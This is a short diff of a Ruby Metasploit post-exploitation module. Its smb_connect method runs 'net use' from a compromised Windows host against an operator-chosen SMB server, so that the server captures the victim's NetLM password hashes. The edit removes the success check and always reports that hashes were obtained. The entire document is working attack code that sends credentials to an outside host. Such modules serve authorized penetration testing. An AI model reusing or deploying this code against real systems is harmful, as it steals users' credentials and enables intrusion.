@@ -49,10 +49,8 @@ class Metasploit3 < Msf::Post
 	def smb_connect
 		begin
 			print_status("Establishing SMB connection to " + datastore['SMBHOST'])
-			res = cmd_exec("cmd.exe","/c net use \\\\#{datastore['SMBHOST']}")
-			if res =~ /The command completed successfully/
-				print_good("The SMBHOST should now have NetLM hashes")
-			end
+			cmd_exec("cmd.exe","/c net use \\\\#{datastore['SMBHOST']}")
+			print_good("The SMBHOST should now have NetLM hashes")
 		rescue
 			print_error("Issues establishing SMB connection")
 		end
